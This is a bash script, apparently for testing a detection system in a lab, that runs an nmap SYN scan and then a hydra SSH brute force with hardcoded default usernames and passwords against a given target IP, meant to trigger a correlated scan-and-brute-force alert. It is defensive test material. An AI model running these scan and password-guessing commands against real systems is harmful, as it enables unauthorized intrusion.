#!/usr/bin/env bash
# Run from the ATTACKER VM.
# Simulates a sophisticated attacker that recons then brute forces —
# triggering SSH + scan correlation escalation on the defender.
# Usage: bash correlation_attack.sh <target_ip>
# Requires: nmap, hydra

set -euo pipefail
TARGET="${1:?Usage: $0 <target_ip>}"

echo "[attacker] Correlation attack sequence against $TARGET"
echo "[attacker] This should trigger correlated_ssh_scan at critical confidence"
echo ""

echo "[attacker] Step 1: Reconnaissance scan..."
nmap -sS -T3 -p 1-500 "$TARGET" > /tmp/recon.txt 2>&1
echo "[attacker] Recon done ($(grep -c 'open' /tmp/recon.txt || echo 0) open ports found)"

echo "[attacker] Waiting 10s (simulating attacker analysis pause)..."
sleep 10

echo "[attacker] Step 2: SSH brute force (same source IP)..."
PASSLIST=$(mktemp)
cat > "$PASSLIST" <<'EOF'
password
admin
tara
root
jetson
ubuntu
EOF
USERLIST=$(mktemp)
cat > "$USERLIST" <<'EOF'
root
admin
tara
ubuntu
EOF

hydra -L "$USERLIST" -P "$PASSLIST" -t 4 -W 1 -s 22 ssh://"$TARGET" 2>&1 | tail -5
rm -f "$PASSLIST" "$USERLIST"

echo ""
echo "[attacker] Done. The defender should escalate to correlated_ssh_scan:critical"
echo "[attacker] Check: tara-admin incidents -n 20"
